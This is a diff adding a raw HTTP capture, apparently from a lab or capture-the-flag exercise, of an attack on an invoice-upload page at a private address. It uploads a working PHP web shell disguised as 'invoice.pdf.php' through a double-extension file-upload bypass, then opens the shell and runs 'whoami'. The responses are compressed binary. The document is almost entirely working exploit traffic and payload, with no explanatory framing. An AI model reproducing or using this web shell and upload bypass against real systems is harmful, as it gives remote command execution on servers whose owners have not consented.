@@ -1,0 +1,100 @@
+POST /upload_invoice.php HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------72648657520722646782524831288
+Content-Length: 674
+Origin: http://10.87.1.2
+Connection: keep-alive
+Referer: http://10.87.1.2/send_invoice.php
+Upgrade-Insecure-Requests: 1
+
+-----------------------------72648657520722646782524831288
+Content-Disposition: form-data; name="po_number"
+
+870128353
+-----------------------------72648657520722646782524831288
+Content-Disposition: form-data; name="invoice_file"; filename="invoice.pdf.php"
+Content-Type: application/x-php
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+
+-----------------------------72648657520722646782524831288--
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:26 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 124
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+............;
+.0..{...Jg.^....rc?.....c..m..f....3.~.[.-.'....No...n..D.....b..wt.&....*+..2..{.W6.........
+R..8......G&}...
+GET /invoices/870128353/invoice.pdf.php HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:29 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 156
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+..........]..
+.0..w."..ZG..A...d.....@.\..b}zo088}.?8..8.w.3.....E.......)&...aZS0..u
+z.\
+.f..!..z..&Z)t.......ZKxsz..oo.....U...z......7L..........z.N.....
+GET /invoices/870128353/invoice.pdf.php?cmd=whoami HTTP/1.1
+Host: 10.87.1.2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://10.87.1.2/invoices/870128353/invoice.pdf.php
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Oct 2024 18:57:33 GMT
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 164
+Keep-Alive: timeout=5, max=98
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+..........]O.
+.0....!...C.A...d....	4Mho...{....p^p.w..........@...uCO..d..4..s...I.:.D1...........UAS"3D.U....4.......z;^...e....Q...b...4..*.......s.Mf..o]..{....
